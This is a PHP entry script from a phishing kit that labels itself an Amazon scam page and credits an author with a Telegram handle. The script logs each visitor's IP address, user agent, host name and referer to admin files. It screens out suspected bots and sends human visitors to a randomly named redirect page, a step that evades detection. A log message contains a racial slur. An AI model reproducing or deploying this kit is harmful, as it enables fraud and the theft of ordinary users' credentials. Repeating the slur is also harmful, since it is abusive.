<?php
//<!-- SCAM PAGE AMAZON #By YOCHI, WORK HARD DREAM B!G --> 
 /* ___      ___      _______  __
	\  \    /  /     /  _____||  |
	 \  \  /  /	    /  /	  |  |
	  \  \/  /	   |  |		  |  |___    O
	   \    /____  |  |       |   ___ \	 _
		|  |/_ _ \ |  |       |  |   \ || |
        |  | o_o  | \  \____  |  |   | || |
		|__|\____/   \______| |__|   |_||_|     grrrr
	Telegram : @yo_chi
									   */
session_start();
date_default_timezone_set('America/New_York');
$dt=date('d M Y H:i:s');
if(isset($_SERVER['HTTP_REFERER'])){$rf = $_SERVER['HTTP_REFERER'];} else{$rf = 'NOT REFERED';};
$ib="--------| VIS!T0R|--------<br/>
IP = ".$_SERVER['REMOTE_ADDR'].'<br/>
USER-AGENT = '.$_SERVER['HTTP_USER_AGENT'].'<br/>
HOST ADDR = '.gethostbyaddr($_SERVER['REMOTE_ADDR']).'<br/>
REFERER = '.$rf.'<br/>
DATETIME = '.$dt.'<br/>
<br/>
';
$_SESSION['homedir']=__DIR__;
$mile = fopen("admin/yo.txt","a");
fwrite($mile,$ib);
fclose($mile);
$filedir='admin/db.json';
$ud=file_get_contents($filedir);
$udarray = json_decode($ud,true);
foreach($udarray as $key=>$value){$narr[$key]=$value;};
$narr['visits'] += 1;
$narr['humans'] += 1;
array_push($narr['ips'],$_SERVER['REMOTE_ADDR']);
file_put_contents($filedir,json_encode($narr));
$d=dirname($_SERVER['PHP_SELF'],1);
if($d != '\\' && $d != '/'){$isshell=__DIR__;};
include('btm.php');
$_SESSION['dbvar']=strtolower(substr(md5(uniqid().'db') , -6));
$_SESSION['sshh']=strtolower(substr(md5(uniqid().'height') , -5));
$_SESSION['ssww']=strtolower(substr(md5(uniqid().'width') , -5));
if (!isset($timecookie)){logbot('SAD LIFE NIGGA');banbot();exit();};
setcookie($timecookie,$timecookievalue,time()+86400*30,'/');
setcookie($bottime,time(),time()+86400*30,'/');
$_SESSION['indexfile']=substr(md5($_SERVER['HTTP_HOST'].'yochithegreatloner') , -4);
$redc=file_get_contents('dir.php');
$redname=substr(md5($_SERVER['HTTP_HOST']) , -4);
if(!file_exists($redname.".php")){
$red = fopen($redname.".php","w");
fwrite($red,$redc);
fclose($red);};
header('location:'.$redname);
?>